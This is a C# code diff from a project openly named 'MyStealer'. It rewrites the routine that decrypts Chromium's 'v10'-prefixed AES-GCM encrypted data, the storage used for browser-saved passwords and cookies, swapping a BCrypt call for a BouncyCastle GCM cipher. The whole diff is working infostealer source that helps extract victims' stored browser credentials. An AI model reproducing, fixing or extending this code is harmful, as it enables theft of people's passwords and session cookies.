@@ -4,6 +4,7 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Linq;
 using Serilog;
+using MyStealer.Utils.BcAesGcm;
 
 namespace MyStealer.Utils.Chromium
 {
@@ -73,12 +74,17 @@ namespace MyStealer.Utils.Chromium
             {
                 _ = cipherReader.ReadBytes(nonSecretPayloadLength); // strip nasty 'v10' prefix
                 var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
-                var cipherText = cipherReader.ReadBytes(payloadLength - nonSecretPayloadLength - NONCE_BIT_SIZE / 8 - MAC_BIT_SIZE / 8);
+                var cipher = new GcmBlockCipher(new AesEngine());
+                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce, null);
+                cipher.Init(false, parameters);
 
-                // according to the GCM specification, tag is appended at the END of ciphertext
-                // https://stackoverflow.com/q/67989548
-                var mac = cipherReader.ReadBytes(MAC_BIT_SIZE / 8);
-                return BCryptAesGcm.GcmDecrypt(cipherText, key, nonce, mac);
+                var cipherText = cipherReader.ReadBytes(payloadLength - nonSecretPayloadLength - NONCE_BIT_SIZE / 8);
+                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
+
+                var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
+                cipher.DoFinal(plainText, len);
+
+                return plainText;
             }
         }
     }
